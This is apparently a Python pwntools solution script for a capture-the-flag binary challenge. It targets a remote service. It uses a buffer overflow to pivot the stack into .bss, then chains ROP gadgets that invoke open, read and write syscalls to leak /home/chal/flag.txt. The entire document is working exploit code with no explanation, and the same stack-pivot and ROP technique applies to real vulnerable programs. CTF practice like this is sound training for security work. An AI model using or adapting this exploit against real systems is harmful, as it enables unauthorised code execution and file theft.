#!/usr/bin/env python3

from pwn import *

# r = process("./share/chal")
r = remote("10.113.184.121", 10054)

pop_rax_ret = 0x0000000000448D27
pop_rdi_ret = 0x0000000000401832
pop_rsi_ret = 0x000000000040F01E
pop_rdx_ret = 0x000000000040173F
syscall = 0x0000000000416924
ret = 0x000000000040101A

main_lea = 0x401CE1
bss = 0x00000000004C2700

# Pivot

old_rbp = p64(bss)
payload = b"A" * 0x20 + old_rbp + p64(main_lea)
payload += b"\x00" * (0x80 - len(payload))

r.send(payload)

# open("/home/chal/flag.txt", 0, 0)")

rop_chain = p64(pop_rax_ret) + p64(0x2)  # open
rop_chain += p64(pop_rdi_ret) + p64(bss - 0x20)  # filename
rop_chain += p64(pop_rsi_ret) + p64(0)  # flags
rop_chain += p64(pop_rdx_ret) + p64(0)  # mode
rop_chain += p64(ret) + p64(syscall)

old_rbp = p64(bss + 0x400)
filename = b"/home/chal/flag.txt\x00"
payload = filename + b"A" * (0x20 - len(filename)) + old_rbp + rop_chain + p64(main_lea)

r.send(payload)

# read(3, buf, 0x30)

rop_chain = p64(pop_rax_ret) + p64(0x0)  # read
rop_chain += p64(pop_rdi_ret) + p64(0x3)  # fd
rop_chain += p64(pop_rsi_ret) + p64(bss + 0x200)  # buf
rop_chain += p64(pop_rdx_ret) + p64(0x30)  # count
rop_chain += p64(ret) + p64(syscall)

old_rbp = p64(bss)
payload = b"A" * 0x20 + old_rbp + rop_chain + p64(main_lea)

r.send(payload)

# write(1, buf, 0x30)

rop_chain = p64(pop_rax_ret) + p64(0x1)  # write
rop_chain += p64(pop_rdi_ret) + p64(0x1)  # fd
rop_chain += p64(pop_rsi_ret) + p64(bss + 0x200)  # buf
rop_chain += p64(pop_rdx_ret) + p64(0x30)  # count
rop_chain += p64(ret) + p64(syscall)

old_rbp = p64(bss + 0x400)
payload = b"A" * 0x20 + old_rbp + rop_chain + p64(main_lea)

r.send(payload)

r.interactive()
